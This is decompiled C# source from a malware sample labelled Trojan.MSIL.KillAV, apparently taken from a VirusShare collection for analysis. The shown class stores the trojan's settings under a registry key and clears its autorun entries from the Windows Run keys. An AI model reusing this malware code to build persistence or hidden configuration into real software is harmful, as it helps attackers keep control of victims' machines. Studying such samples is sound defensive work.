// Decompiled with JetBrains decompiler
// Type: nv.NK
// Assembly: nv, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D9D26A5E-13B6-4DC4-B014-052E2F5FE723
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.KillAV.ao-71e232c7af7ac92395beadd9c8a364c7e48a0978a010598a9978211f4ebd3b5a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;

namespace nv
{
  [StandardModule]
  public sealed class NK
  {
    public static string Key = "HKEY_CURRENT_USER\\Software\\nKey";
    public static Registry R;

    public static void SetValue(ref string N, ref string V) => Registry.SetValue(NK.Key, N, (object) V, RegistryValueKind.String);

    public static string GetValue(ref string N, ref string DF)
    {
      string Left = Conversions.ToString(Registry.GetValue(NK.Key, N, (object) null));
      return Operators.CompareString(Left, (string) null, false) == 0 ? DF : Left;
    }

    public static void DeleteValue(ref string N)
    {
      Array Instance = (Array) Strings.Split(NK.Key, "\\");
      string name = NK.Key.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object) Instance, new object[1]
      {
        (object) 0
      }, (string[]) null), (object) "\\")), "");
      Registry.CurrentUser.OpenSubKey(name, true).DeleteValue(N);
    }

    public static void CLEAR()
    {
      string su = O.SU;
      O.SU = "*";
      string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
      if (Operators.CompareString(su, "*", false) != 0)
      {
        try
        {
          Registry.LocalMachine.OpenSubKey(name, true).DeleteValue(su);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          Registry.CurrentUser.OpenSubKey(name, true).DeleteValue(su);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Array Instance = (Array) Strings.Split(NK.Key, "\\");
        Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance, new object[1]
        {
          (object) checked (Instance.Length - 1)
        }, (string[]) null)), false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
